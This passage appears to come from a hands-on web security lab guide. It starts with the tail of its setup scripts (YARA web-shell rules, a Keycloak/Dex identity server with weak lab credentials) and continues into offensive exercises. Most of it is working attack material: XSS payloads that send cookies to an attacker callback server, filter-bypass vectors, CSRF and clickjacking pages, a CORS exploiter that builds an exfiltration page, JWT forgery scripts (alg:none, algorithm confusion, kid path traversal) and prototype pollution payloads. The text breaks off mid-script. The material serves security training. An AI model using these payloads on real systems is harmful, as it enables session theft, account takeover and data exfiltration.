    strings:
        $runtime_exec = "Runtime.getRuntime().exec(request.getParameter" ascii
        $process_builder = "ProcessBuilder" ascii
    condition:
        any of them and filesize < 100KB
}

rule ASPX_WebShell {
    meta:
        description = "Detects ASPX web shells"
        severity = "critical"
    strings:
        $process = "System.Diagnostics.Process" ascii
        $cmd = "ProcessStartInfo" ascii
    condition:
        all of them and filesize < 200KB
}
YARA

echo "[+] VM3 setup complete — WAF, ELK, Sigma, YARA deployed"
```

### VM4: OAuth/SAML Infrastructure

```bash
#!/bin/bash
# vm4_setup.sh — OAuth/SAML identity infrastructure

set -euo pipefail

apt-get update && apt-get install -y docker.io docker-compose-v2

mkdir -p /opt/idp && cd /opt/idp

cat > docker-compose.yml << 'IDPDC'
services:
  keycloak:
    image: quay.io/keycloak/keycloak:23.0
    command: start-dev
    environment:
      KC_DB: dev-mem
      KEYCLOAK_ADMIN: admin
      KEYCLOAK_ADMIN_PASSWORD: admin123
      KC_HOSTNAME_STRICT: "false"
      KC_HTTP_ENABLED: "true"
    ports:
      - "8180:8080"

  dex:
    image: ghcr.io/dexidp/dex:v2.37.0
    command: dex serve /etc/dex/config.yml
    volumes:
      - ./dex-config.yml:/etc/dex/config.yml
    ports:
      - "5556:5556"
IDPDC

cat > dex-config.yml << 'DEXCFG'
issuer: http://10.8.0.40:5556/dex
storage:
  type: memory
web:
  http: 0.0.0.0:5556
staticClients:
  - id: vuln-app
    redirectURIs:
      - 'http://10.8.0.10:3000/callback'
      - 'http://10.8.0.10:3000/auth/callback'
    name: 'Vulnerable Lab App'
    secret: lab-client-secret-12345
enablePasswordDB: true
staticPasswords:
  - email: "admin@lab.local"
    hash: "$2a$10$2b2cU8CPhOTaGrs1HRQuAueS7JTT5ZHsHSzYiFPm1leZck7Mc8T4W"
    username: "admin"
    userID: "08a8684b-db88-4b73-90a9-3cd1661f5466"
  - email: "user@lab.local"
    hash: "$2a$10$2b2cU8CPhOTaGrs1HRQuAueS7JTT5ZHsHSzYiFPm1leZck7Mc8T4W"
    username: "user"
    userID: "41331323-6f44-45e6-b3b9-2c4b60c02be5"
DEXCFG

docker compose up -d

echo "[+] VM4 setup complete — Keycloak on :8180, Dex on :5556"
```

---

## PART A: OFFENSIVE — Attack Scenarios

### Exercise 1: Cross-Site Scripting (XSS) — All Variants

**Objective:** Exploit reflected, stored, DOM-based, and blind XSS vulnerabilities. Demonstrate filter bypass techniques and framework-specific vectors.

#### Step 1: Reflected XSS Discovery and Exploitation

```bash
# Identify the reflection point
curl -s "http://10.8.0.10:3000/search?q=CANARY_TOKEN_12345" | grep -i canary
# Expected: <h1>Search Results for: CANARY_TOKEN_12345</h1>
# The input is reflected in raw HTML context without encoding

# Basic reflected XSS — script tag injection
curl -s "http://10.8.0.10:3000/search?q=<script>alert(document.domain)</script>"
# Expected: the <script> tag is rendered directly in the response

# Cookie theft payload
PAYLOAD='<script>new Image().src="http://10.8.0.20:8080/exfil?c="%2Bdocument.cookie</script>'
echo "Exploit URL: http://10.8.0.10:3000/search?q=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")"

# Verify callback on attacker server
tail -f /opt/attacker-server/stolen_data.log
```

#### Step 2: Filter Bypass Techniques

```bash
# If basic <script> is blocked, use event handlers
# Event handler — img onerror
curl "http://10.8.0.10:3000/search?q=<img+src=x+onerror=alert(1)>"

# Event handler — svg onload
curl "http://10.8.0.10:3000/search?q=<svg+onload=alert(document.cookie)>"

# Event handler — details/ontoggle
curl "http://10.8.0.10:3000/search?q=<details+open+ontoggle=alert(1)>"

# JavaScript URI handler
curl "http://10.8.0.10:3000/search?q=<a+href='javascript:alert(1)'>click</a>"

# Encoding bypass — HTML entity encoding
curl "http://10.8.0.10:3000/search?q=%26lt;script%26gt;alert(1)%26lt;/script%26gt;"

# Case variation (bypasses case-sensitive regex filters)
curl "http://10.8.0.10:3000/search?q=<ScRiPt>alert(1)</sCrIpT>"

# Template literal (backtick) — bypasses parenthesis filters
curl "http://10.8.0.10:3000/search?q=<img+src=x+onerror=alert\`1\`>"

# String concatenation — bypasses keyword filters
curl "http://10.8.0.10:3000/search?q=<img+src=x+onerror=window['al'%2B'ert'](1)>"

# Base64 decode eval — bypasses content inspection
curl "http://10.8.0.10:3000/search?q=<img+src=x+onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>"

# SVG namespace-switching (bypasses HTML-context filters)
curl "http://10.8.0.10:3000/search?q=<svg><animate+onbegin=alert(1)+attributeName=x+dur=1s>"
```

#### Step 3: Stored XSS

```bash
# Post a comment with an XSS payload
curl -X POST http://10.8.0.10:3000/comments \
  -d "author=TestUser&body=<script>fetch('http://10.8.0.20:8080/stored-xss?cookies='+document.cookie)</script>"

# Verify the payload is stored and rendered to all visitors
curl -s http://10.8.0.10:3000/comments | grep -i "script"

# More stealthy stored XSS — img tag (less visible)
curl -X POST http://10.8.0.10:3000/comments \
  -d "author=Innocent&body=Great post!<img src=x onerror=fetch('http://10.8.0.20:8080/s?c='+document.cookie) style='display:none'>"
```

#### Step 4: DOM-Based XSS

```bash
# DOM XSS via location.hash — the payload never touches the server
echo "Exploit URL: http://10.8.0.10:3000/dom-xss#<img src=x onerror=alert(document.cookie)>"

# The vulnerable code reads location.hash and writes to innerHTML
# Server logs will NOT show the XSS payload — it stays client-side

# Verify by examining the page source
curl -s http://10.8.0.10:3000/dom-xss | grep -A5 "innerHTML"
# The JavaScript reads: document.getElementById('output').innerHTML = 'Hello, ' + userInput

# Advanced DOM XSS with external script loading
echo "URL: http://10.8.0.10:3000/dom-xss#<script src=http://10.8.0.20:8080/xss-hook.js></script>"
```

#### Step 5: Automated XSS Discovery

```bash
# XSStrike — automated XSS scanner
python3 -m xsstrike -u "http://10.8.0.10:3000/search?q=test" --crawl

# Dalfox — Go-based XSS scanner with parameter discovery
dalfox url "http://10.8.0.10:3000/search?q=test" --blind "http://10.8.0.20:8080/blind-xss"

# Manual Burp Intruder approach (command-line equivalent)
# Use SecLists XSS payloads
while IFS= read -r payload; do
  response=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" \
    "http://10.8.0.10:3000/search?q=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))")")
  echo "$response | $payload"
done < /opt/SecLists/Fuzzing/XSS/XSS-BruteLogic.txt | head -50
```

**Expected output:** Multiple reflected XSS vectors succeed. Stored XSS persists across page loads. DOM XSS triggers client-side without server-side evidence. The attacker callback server logs stolen cookies and page content.

---

### Exercise 2: CSRF Exploitation

**Objective:** Exploit Cross-Site Request Forgery to change victim account settings. Demonstrate token bypass techniques and SameSite cookie analysis.

#### Step 1: Identify CSRF Vulnerability

```bash
# Login as the victim first (get a session cookie)
SESSION_COOKIE=$(curl -s -c - -X POST http://10.8.0.10:3000/login \
  -d "username=alice&password=alice123" | grep connect.sid | awk '{print $NF}')

echo "Victim session: $SESSION_COOKIE"

# Verify the email update endpoint has no CSRF protection
curl -s -X POST http://10.8.0.10:3000/profile/update-email \
  -H "Cookie: connect.sid=$SESSION_COOKIE" \
  -d "email=test@check.com"
# Expected: Email updated — no CSRF token required

# Verify no SameSite attribute on cookie
curl -s -D- -X POST http://10.8.0.10:3000/login \
  -d "username=alice&password=alice123" | grep -i "set-cookie"
# Expected: No SameSite attribute → browser defaults to Lax in modern browsers
# But our lab cookie explicitly sets sameSite: false
```

#### Step 2: Build and Deploy CSRF Exploit

```bash
# The attacker server already hosts the CSRF PoC at /csrf-poc.html
# Victim visits: http://10.8.0.20:8080/csrf-poc.html

# Manual CSRF PoC — auto-submitting form
cat > /tmp/csrf_poc.html << 'CSRFPOC'
<!DOCTYPE html>
<html>
<body onload="document.getElementById('f').submit()">
  <h1>Loading your prize...</h1>
  <form id="f" action="http://10.8.0.10:3000/profile/update-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
  </form>
</body>
</html>
CSRFPOC

# JSON content-type CSRF (for APIs that accept JSON)
cat > /tmp/csrf_json.html << 'CSRFJSON'
<!DOCTYPE html>
<html>
<body>
<script>
// Uses fetch with no-cors mode — the request is sent but response is opaque
// The browser still sends cookies (if SameSite allows it)
fetch('http://10.8.0.10:3000/profile/update-email', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'email=attacker-json@evil.com'
});
</script>
<p>Loading...</p>
</body>
</html>
CSRFJSON

# Verify the attack succeeded
curl -s http://10.8.0.10:3000/profile \
  -H "Cookie: connect.sid=$SESSION_COOKIE" | grep -i "email"
```

#### Step 3: SameSite Cookie Behavior Analysis

```python
#!/usr/bin/env python3
"""sameSite_analyzer.py — Test SameSite cookie behavior across scenarios."""

import requests
import json

TARGET = "http://10.8.0.10:3000"

def test_samesite_behavior():
    """Analyze how cookies are sent in different cross-site scenarios."""
    
    # Login and get session
    s = requests.Session()
    r = s.post(f"{TARGET}/login", data={"username": "alice", "password": "alice123"})
    
    cookies = s.cookies.get_dict()
    print("=== Session Cookies ===")
    for name, value in cookies.items():
        print(f"  {name}: {value[:20]}...")
    
    # Check cookie attributes via response headers
    login_resp = requests.post(f"{TARGET}/login", 
                                data={"username": "alice", "password": "alice123"},
                                allow_redirects=False)
    set_cookie = login_resp.headers.get('Set-Cookie', '')
    print(f"\n=== Set-Cookie Header ===")
    print(f"  {set_cookie}")
    
    # Analyze attributes
    attributes = {
        'HttpOnly': 'httponly' in set_cookie.lower(),
        'Secure': 'secure' in set_cookie.lower(),
        'SameSite': 'samesite' in set_cookie.lower(),
        'Path': 'path=' in set_cookie.lower(),
    }
    
    print(f"\n=== Cookie Security Analysis ===")
    for attr, present in attributes.items():
        status = "PRESENT" if present else "MISSING (VULNERABLE)"
        print(f"  {attr}: {status}")
    
    # SameSite behavior matrix
    print(f"\n=== SameSite Attack Surface ===")
    if not attributes['SameSite']:
        print("  [!] No SameSite attribute set")
        print("  [!] Modern browsers default to Lax")
        print("  [!] But if SameSite=None is explicit: full CSRF attack surface")
        print("  Attack vectors:")
        print("    - Cross-site form POST: POSSIBLE if SameSite=None")
        print("    - Cross-site JS fetch with credentials: POSSIBLE if SameSite=None")
        print("    - Cross-site iframe embedding: POSSIBLE if SameSite=None")
        print("    - Top-level navigation GET: POSSIBLE (even with Lax)")
    
    if not attributes['HttpOnly']:
        print("\n  [!] HttpOnly not set")
        print("  [!] document.cookie can read session — XSS enables session theft")

if __name__ == '__main__':
    test_samesite_behavior()
```

```bash
python3 sameSite_analyzer.py
```

**Expected output:** Email successfully changed to attacker-controlled address via CSRF. Cookie analysis reveals missing security attributes enabling the attack.

---

### Exercise 3: CORS Misconfiguration Exploitation

**Objective:** Exploit reflected-origin CORS misconfiguration to steal authenticated user data cross-origin.

#### Step 1: Identify CORS Misconfiguration

```bash
# Send request with arbitrary Origin header
curl -s -D- -H "Origin: https://evil.com" http://10.8.0.10:3000/api/user-data | head -20
# Expected:
#   Access-Control-Allow-Origin: https://evil.com    ← REFLECTED!
#   Access-Control-Allow-Credentials: true            ← WITH CREDENTIALS!

# This is the most dangerous CORS misconfiguration:
# ANY origin can read authenticated responses including cookies

# Test with null origin (sandboxed iframe)
curl -s -D- -H "Origin: null" http://10.8.0.10:3000/api/user-data | grep -i access-control

# Automated CORS testing with Nuclei
cat > /tmp/cors-check.yaml << 'NUCLEI'
id: cors-reflected-origin
info:
  name: CORS Reflected Origin with Credentials
  severity: high
http:
  - method: GET
    path:
      - "{{BaseURL}}/api/user-data"
    headers:
      Origin: "https://evil-attacker.com"
    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "Access-Control-Allow-Origin: https://evil-attacker.com"
      - type: word
        part: header
        words:
          - "Access-Control-Allow-Credentials: true"
NUCLEI

nuclei -t /tmp/cors-check.yaml -u http://10.8.0.10:3000 -v
```

#### Step 2: Exploit CORS to Steal Authenticated Data

```bash
# The attacker hosts the exploit page at http://10.8.0.20:8080/cors-exploit.html
# When a logged-in victim visits this page, their browser:
# 1. Sends a fetch() to /api/user-data with credentials (cookies)
# 2. The server reflects the attacker's origin in ACAO header
# 3. The browser allows the attacker's JavaScript to read the response
# 4. The attacker exfiltrates the data to their server

# Simulate the victim visiting the attacker's page
echo "Victim should visit: http://10.8.0.20:8080/cors-exploit.html"

# Monitor exfiltrated data on attacker server
tail -f /opt/attacker-server/stolen_data.log | grep "stolen"
```

#### Step 3: CORS Exploitation Script

```python
#!/usr/bin/env python3
"""cors_exploiter.py — Automated CORS misconfiguration scanner and exploiter."""

import requests
import json
from urllib.parse import urlparse

class CORSExploiter:
    def __init__(self, target_url):
        self.target = target_url
        self.findings = []
    
    def test_reflected_origin(self):
        """Test if the server reflects arbitrary Origin headers."""
        test_origins = [
            "https://evil.com",
            "https://attacker.example.com",
            f"https://{urlparse(self.target).hostname}.evil.com",
            "null",
        ]
        
        for origin in test_origins:
            headers = {"Origin": origin}
            try:
                r = requests.get(self.target, headers=headers, timeout=5)
                acao = r.headers.get("Access-Control-Allow-Origin", "")
                acac = r.headers.get("Access-Control-Allow-Credentials", "")
                
                if acao == origin and acac.lower() == "true":
                    finding = {
                        "type": "REFLECTED_ORIGIN_WITH_CREDENTIALS",
                        "severity": "CRITICAL",
                        "origin_tested": origin,
                        "acao": acao,
                        "acac": acac,
                        "impact": "Any website can read authenticated API responses"
                    }
                    self.findings.append(finding)
                    print(f"[CRITICAL] Reflected origin with credentials: {origin}")
                elif acao == origin:
                    finding = {
                        "type": "REFLECTED_ORIGIN",
                        "severity": "HIGH",
                        "origin_tested": origin,
                        "acao": acao,
                        "impact": "Any website can read unauthenticated API responses"
                    }
                    self.findings.append(finding)
                    print(f"[HIGH] Reflected origin: {origin}")
                elif acao == "*" and acac.lower() == "true":
                    print(f"[INVALID] Wildcard with credentials (browser rejects)")
                else:
                    print(f"[OK] Origin {origin} not reflected")
            except Exception as e:
                print(f"[ERROR] {origin}: {e}")
    
    def test_regex_bypass(self):
        """Test common regex validation bypasses."""
        parsed = urlparse(self.target)
        domain = parsed.hostname
        
        bypass_origins = [
            f"https://{domain}.evil.com",
            f"https://evil{domain}",
            f"https://{domain}%60evil.com",
            f"https://evil.com%0d%0aX-Injected:true",
        ]
        
        for origin in bypass_origins:
            try:
                r = requests.get(self.target, headers={"Origin": origin}, timeout=5)
                acao = r.headers.get("Access-Control-Allow-Origin", "")
                if acao and acao != "*" and "evil" in acao:
                    print(f"[HIGH] Regex bypass successful with: {origin}")
                    self.findings.append({
                        "type": "REGEX_BYPASS",
                        "severity": "HIGH",
                        "origin": origin,
                        "reflected_as": acao
                    })
            except:
                pass
    
    def generate_exploit_page(self):
        """Generate an HTML exploit page for confirmed CORS vulnerabilities."""
        if not self.findings:
            print("No exploitable findings.")
            return
        
        html = f"""<!DOCTYPE html>
<html>
<head><title>CORS Exploit PoC</title></head>
<body>
<h1>CORS Exploitation PoC</h1>
<div id="output">Loading...</div>
<script>
fetch('{self.target}', {{ credentials: 'include' }})
  .then(r => r.text())
  .then(data => {{
    document.getElementById('output').textContent = data;
    // Exfiltrate
    fetch('http://10.8.0.20:8080/cors-stolen', {{
      method: 'POST',
      body: data
    }});
  }})
  .catch(e => document.getElementById('output').textContent = 'Error: ' + e);
</script>
</body>
</html>"""
        
        with open('/tmp/cors_exploit.html', 'w') as f:
            f.write(html)
        print(f"\n[+] Exploit page written to /tmp/cors_exploit.html")
    
    def report(self):
        print(f"\n{'='*60}")
        print(f"CORS Misconfiguration Report: {self.target}")
        print(f"{'='*60}")
        for f in self.findings:
            print(f"\n  [{f['severity']}] {f['type']}")
            for k, v in f.items():
                if k not in ('type', 'severity'):
                    print(f"    {k}: {v}")
        print(f"\nTotal findings: {len(self.findings)}")

if __name__ == '__main__':
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "http://10.8.0.10:3000/api/user-data"
    exploiter = CORSExploiter(target)
    exploiter.test_reflected_origin()
    exploiter.test_regex_bypass()
    exploiter.generate_exploit_page()
    exploiter.report()
```

**Expected output:** CORS reflected-origin vulnerability confirmed. Exploit page successfully reads authenticated data cross-origin and exfiltrates it.

---

### Exercise 4: JWT Token Attacks

**Objective:** Exploit JWT vulnerabilities including `none` algorithm bypass, RS256→HS256 algorithm confusion, and `kid` header injection.

#### Step 1: Obtain a Legitimate JWT

```bash
# Login and get a JWT
TOKEN=$(curl -s -X POST http://10.8.0.10:3000/api/jwt/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user","password":"user123"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

echo "JWT: $TOKEN"

# Decode the JWT (without verification)
echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null; echo
# Expected header: {"alg":"RS256","typ":"JWT"}

echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null; echo
# Expected payload: {"sub":2,"username":"user","role":"user",...}

# Verify we can't access admin endpoint with user token
curl -s http://10.8.0.10:3000/api/jwt/admin \
  -H "Authorization: Bearer $TOKEN"
# Expected: 403 Forbidden — role is "user"
```

#### Step 2: None Algorithm Attack

```bash
# Use jwt_tool for the none algorithm attack
cd /opt/jwt_tool

# Automated vulnerability scan
python3 jwt_tool.py "$TOKEN" -M at 2>/dev/null | head -40

# None algorithm bypass — create token with no signature
python3 jwt_tool.py "$TOKEN" -X a
```

```python
#!/usr/bin/env python3
"""jwt_none_attack.py — Forge JWT with alg:none to bypass signature verification."""

import base64
import json
import sys

def base64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def forge_none_token(original_token):
    """Create a forged JWT with alg:none and elevated privileges."""
    parts = original_token.split('.')
    
    # Decode original payload
    payload_padded = parts[1] + '=' * (4 - len(parts[1]) % 4)
    payload = json.loads(base64.urlsafe_b64decode(payload_padded))
    
    print(f"Original payload: {json.dumps(payload, indent=2)}")
    
    # Forge new header with alg: none
    forged_header = {"alg": "none", "typ": "JWT"}
    
    # Escalate privileges
    forged_payload = payload.copy()
    forged_payload['role'] = 'admin'
    forged_payload['username'] = 'admin'
    forged_payload['sub'] = 1
    
    print(f"Forged payload: {json.dumps(forged_payload, indent=2)}")
    
    # Build the token: header.payload. (empty signature)
    header_b64 = base64url_encode(json.dumps(forged_header).encode())
    payload_b64 = base64url_encode(json.dumps(forged_payload).encode())
    
    # Different none variants to try
    variants = [
        ("none", f"{header_b64}.{payload_b64}."),
        ("None", None),
        ("NONE", None),
        ("nOnE", None),
    ]
    
    tokens = []
    for alg_name, token in variants:
        if token is None:
            h = {"alg": alg_name, "typ": "JWT"}
            h_b64 = base64url_encode(json.dumps(h).encode())
            token = f"{h_b64}.{payload_b64}."
        tokens.append((alg_name, token))
        print(f"\n  [{alg_name}] {token[:80]}...")
    
    return tokens

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python3 jwt_none_attack.py <JWT_TOKEN>")
        sys.exit(1)
    
    tokens = forge_none_token(sys.argv[1])
    
    import requests
    print("\n=== Testing forged tokens against admin endpoint ===")
    for alg_name, token in tokens:
        try:
            r = requests.get("http://10.8.0.10:3000/api/jwt/admin",
                           headers={"Authorization": f"Bearer {token}"}, timeout=5)
            print(f"  [{alg_name}] Status: {r.status_code} | Response: {r.text[:200]}")
            if r.status_code == 200:
                print(f"  [!!!] ADMIN ACCESS GAINED with alg:{alg_name}")
        except Exception as e:
            print(f"  [{alg_name}] Error: {e}")
```

```bash
python3 jwt_none_attack.py "$TOKEN"
```

#### Step 3: Algorithm Confusion (RS256 → HS256)

```bash
# Download the server's public key
curl -s http://10.8.0.10:3000/public_key.pem -o /tmp/server_public_key.pem
cat /tmp/server_public_key.pem

# Use jwt_tool for key confusion attack
python3 /opt/jwt_tool/jwt_tool.py "$TOKEN" -X k -pk /tmp/server_public_key.pem
```

```python
#!/usr/bin/env python3
"""jwt_algorithm_confusion.py — RS256→HS256 algorithm confusion attack."""

import base64
import json
import hmac
import hashlib
import sys

def base64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def base64url_decode(data):
    padding = 4 - len(data) % 4
    data += '=' * padding
    return base64.urlsafe_b64decode(data)

def algorithm_confusion_attack(original_token, public_key_path):
    """
    Exploit algorithm confusion: sign with HS256 using the RSA public key as HMAC secret.
    If the server reads alg from the token header and uses the public key for verification,
    HS256(public_key, payload) will pass verification.
    """
    parts = original_token.split('.')
    original_payload = json.loads(base64url_decode(parts[1]))
    
    # Read the public key (this is the HMAC secret in the confusion)
    with open(public_key_path, 'rb') as f:
        public_key = f.read()
    
    # Forge header: change RS256 to HS256
    forged_header = {"alg": "HS256", "typ": "JWT"}
    
    # Escalate privileges in payload
    forged_payload = original_payload.copy()
    forged_payload['role'] = 'admin'
    forged_payload['username'] = 'admin'
    forged_payload['sub'] = 1
    
    # Encode
    header_b64 = base64url_encode(json.dumps(forged_header))
    payload_b64 = base64url_encode(json.dumps(forged_payload))
    
    # Sign with HMAC-SHA256 using the RSA public key as the symmetric secret
    signing_input = f"{header_b64}.{payload_b64}".encode()
    signature = hmac.new(public_key, signing_input, hashlib.sha256).digest()
    signature_b64 = base64url_encode(signature)
    
    forged_token = f"{header_b64}.{payload_b64}.{signature_b64}"
    
    print(f"Original algorithm: RS256")
    print(f"Forged algorithm: HS256 (signed with public key as HMAC secret)")
    print(f"Forged payload: {json.dumps(forged_payload, indent=2)}")
    print(f"Forged token: {forged_token[:80]}...")
    
    return forged_token

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print("Usage: python3 jwt_algorithm_confusion.py <TOKEN> <PUBLIC_KEY_PATH>")
        sys.exit(1)
    
    forged = algorithm_confusion_attack(sys.argv[1], sys.argv[2])
    
    import requests
    print("\n=== Testing algorithm confusion against admin endpoint ===")
    r = requests.get("http://10.8.0.10:3000/api/jwt/admin",
                     headers={"Authorization": f"Bearer {forged}"}, timeout=5)
    print(f"Status: {r.status_code}")
    print(f"Response: {r.text[:500]}")
    if r.status_code == 200:
        print("[!!!] ALGORITHM CONFUSION SUCCEEDED — Admin access gained")
```

```bash
python3 jwt_algorithm_confusion.py "$TOKEN" /tmp/server_public_key.pem
```

#### Step 4: Kid Header Injection (Path Traversal)

```python
#!/usr/bin/env python3
"""jwt_kid_injection.py — Exploit kid header path traversal to sign with known content."""

import base64
import json
import hmac
import hashlib
import requests

def base64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def kid_path_traversal():
    """
    Exploit: kid header references a file path.
    /dev/null is empty → HMAC with empty key.
    /proc/sys/kernel/hostname contains a predictable value.
    """
    targets = [
        ("../../../dev/null", b""),
        ("../../../proc/sys/kernel/hostname", None),  # Need to discover the hostname first
    ]
    
    for kid_value, key_content in targets:
        header = {"alg": "HS256", "typ": "JWT", "kid": kid_value}
        payload = {"sub": 1, "username": "admin", "role": "admin"}
        
        header_b64 = base64url_encode(json.dumps(header))
        payload_b64 = base64url_encode(json.dumps(payload))
        signing_input = f"{header_b64}.{payload_b64}".encode()
        
        if key_content is None:
            print(f"\n[*] Skipping {kid_value} — need to discover key content first")
            continue
        
        signature = hmac.new(key_content, signing_input, hashlib.sha256).digest()
        signature_b64 = base64url_encode(signature)
        
        forged_token = f"{header_b64}.{payload_b64}.{signature_b64}"
        
        print(f"\n=== Testing kid: {kid_value} ===")
        print(f"Key: {repr(key_content)}")
        print(f"Token: {forged_token[:80]}...")
        
        try:
            r = requests.get("http://10.8.0.10:3000/api/jwt/kid-admin",
                           headers={"Authorization": f"Bearer {forged_token}"}, timeout=5)
            print(f"Status: {r.status_code}")
            print(f"Response: {r.text[:300]}")
            if r.status_code == 200:
                print("[!!!] KID PATH TRAVERSAL SUCCEEDED")
        except Exception as e:
            print(f"Error: {e}")

if __name__ == '__main__':
    kid_path_traversal()
```

```bash
python3 jwt_kid_injection.py
```

**Expected output:** At least one JWT attack variant succeeds in escalating to admin access. The none algorithm and kid injection are the most likely to succeed against the lab setup.

---

### Exercise 5: Clickjacking and PostMessage Attacks

**Objective:** Exploit clickjacking via iframe overlay and PostMessage origin validation bypass.

#### Step 1: Clickjacking Attack

```bash
# Verify the target page has no frame-busting headers
curl -s -D- http://10.8.0.10:3000/settings/delete-account | grep -iE "x-frame|frame-ancestors"
# Expected: no X-Frame-Options or CSP frame-ancestors header

# The attacker's clickjacking page is at http://10.8.0.20:8080/clickjack.html
# It overlays an invisible iframe of the delete-account page
# with a visible "Claim Your Prize" button positioned over the delete button

echo "Victim should visit: http://10.8.0.20:8080/clickjack.html"
echo "Clicking 'Claim Your Prize' actually clicks 'Delete My Account' in the hidden iframe"
```

#### Step 2: Advanced Clickjacking — Drag-and-Drop

```html
<!-- Save as /opt/attacker-server/dragdrop-clickjack.html -->
<!DOCTYPE html>
<html>
<head><title>Drag and Drop Game</title></head>
<body>
<style>
  .game-area { width:600px; height:400px; border:2px solid #333; position:relative; }
  .draggable { width:80px; height:80px; background:#4CAF50; border-radius:50%;
               position:absolute; cursor:grab; display:flex; align-items:center;
               justify-content:center; color:white; font-weight:bold; }
  .drop-zone { width:120px; height:120px; border:3px dashed #999; position:absolute;
               right:20px; top:140px; display:flex; align-items:center;
               justify-content:center; color:#999; }
  iframe { position:absolute; top:0; left:0; width:600px; height:400px;
           opacity:0.0001; z-index:10; pointer-events:auto; }
</style>

<h1>Drag the ball to the target!</h1>
<div class="game-area">
  <div class="draggable" draggable="true" style="left:50px;top:150px;">Ball</div>
  <div class="drop-zone">Target</div>
  <!-- Hidden iframe — victim drags onto the actual form -->
  <iframe src="http://10.8.0.10:3000/profile"></iframe>
</div>

<script>
const ball = document.querySelector('.draggable');
ball.addEventListener('dragstart', (e) => {
  e.dataTransfer.setData('text/plain', 'attacker@evil.com');
});
</script>
</body>
</html>
```

#### Step 3: PostMessage Origin Bypass

```bash
# Verify the target accepts postMessage from any origin
curl -s http://10.8.0.10:3000/postmessage-vuln | grep -A5 "addEventListener"
# Expected: no origin validation in the message handler

# The attack page is at http://10.8.0.20:8080/postmessage-attack.html
# It embeds the vulnerable page in an iframe and sends a malicious message
# The message contains HTML that gets injected via innerHTML → XSS

echo "Victim visits: http://10.8.0.20:8080/postmessage-attack.html"
echo "The iframe receives a postMessage with XSS payload"
echo "innerHTML renders it → cookie theft"
```

```python
#!/usr/bin/env python3
"""postmessage_scanner.py — Scan for PostMessage vulnerabilities."""

import requests
import re

def scan_postmessage(url):
    """Analyze JavaScript for postMessage vulnerability patterns."""
    r = requests.get(url, timeout=5)
    content = r.text
    
    # Find message event listeners
    listeners = re.findall(
        r'addEventListener\s*\(\s*[\'"]message[\'"].*?\}\s*\)',
        content, re.DOTALL
    )
    
    onmessage = re.findall(r'onmessage\s*=.*?;', content, re.DOTALL)
    
    print(f"=== PostMessage Analysis: {url} ===")
    print(f"Message listeners found: {len(listeners)}")
    print(f"onmessage handlers found: {len(onmessage)}")
    
    # Check for origin validation
    has_origin_check = bool(re.search(
        r'e\.origin\s*[!=]==?\s*[\'"]', content
    ))
    
    # Check for dangerous sinks
    dangerous_sinks = {
        'innerHTML': bool(re.search(r'\.innerHTML\s*=.*e\.data', content)),
        'eval': bool(re.search(r'eval\s*\(.*e\.data', content)),
        'document.write': bool(re.search(r'document\.write\s*\(.*e\.data', content)),
        'location': bool(re.search(r'location\s*=.*e\.data', content)),
    }
    
    print(f"\n  Origin validation: {'YES' if has_origin_check else 'NO (VULNERABLE)'}")
    print(f"  Dangerous sinks using e.data:")
    for sink, present in dangerous_sinks.items():
        if present:
            print(f"    [!] {sink} — VULNERABLE to DOM XSS via postMessage")
    
    if not has_origin_check and any(dangerous_sinks.values()):
        print(f"\n  [CRITICAL] No origin check + dangerous sink = exploitable postMessage XSS")

scan_postmessage("http://10.8.0.10:3000/postmessage-vuln")
```

**Expected output:** Clickjacking PoC renders the delete-account button under a bait overlay. PostMessage attack injects XSS payload through the unvalidated message handler.

---

### Exercise 6: Prototype Pollution

**Objective:** Exploit JavaScript prototype pollution via lodash.merge to escalate privileges and chain into XSS.

#### Step 1: Prototype Pollution via API

```bash
# Normal request — config without admin
curl -s -X POST http://10.8.0.10:3000/api/config \
  -H "Content-Type: application/json" \
  -d '{"theme":"dark","lang":"it"}' | python3 -m json.tool

# Expected: {"config":{"theme":"dark","lang":"it","isAdmin":false},"isAdminOnProto":false}

# Prototype pollution attack — inject __proto__
curl -s -X POST http://10.8.0.10:3000/api/config \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}' | python3 -m json.tool

# Expected: isAdminOnProto should now be true if pollution succeeded
# The empty object {} inherits isAdmin=true from Object.prototype

# Pollution via constructor.prototype
curl -s -X POST http://10.8.0.10:3000/api/config \
  -H "Content-Type: application/json" \
  -d '{"constructor":{"prototype":{"polluted":"yes"}}}' | python3 -m json.tool
```

#### Step 2: Prototype Pollution → XSS Chain

```python
#!/usr/bin/env python3
"""proto_pollution_xss.py — Chain prototype pollution into XSS."""

import requests
import json

TARGET = "http://10.8.0.10:3000"

def test_pollution_chain():
    """
    Prototype pollution can chain to XSS if the application:
    1. Reads a property from an object (checking prototype chain)
    2. Uses that property in a DOM sink (innerHTML, eval, etc.)
    """
    
    # Test 1: Direct isAdmin escalation
    print("=== Test 1: Privilege escalation via __proto__.isAdmin ===")
    r = requests.post(f"{TARGET}/api/config",
                      json={"__proto__": {"isAdmin": True}})
    result = r.json()
    print(f"  isAdminOnProto ({}}.isAdmin): {result.get('isAdminOnProto')}")
    if result.get('isAdminOnProto') == True:
        print("  [!] Prototype pollution CONFIRMED — Object.prototype.isAdmin = true")
    
    # Test 2: Inject HTML template property
    print("\n=== Test 2: Template injection via prototype pollution ===")
    r = requests.post(f"{TARGET}/api/config",
                      json={"__proto__": {
                          "template": "<img src=x onerror=alert('polluted')>",
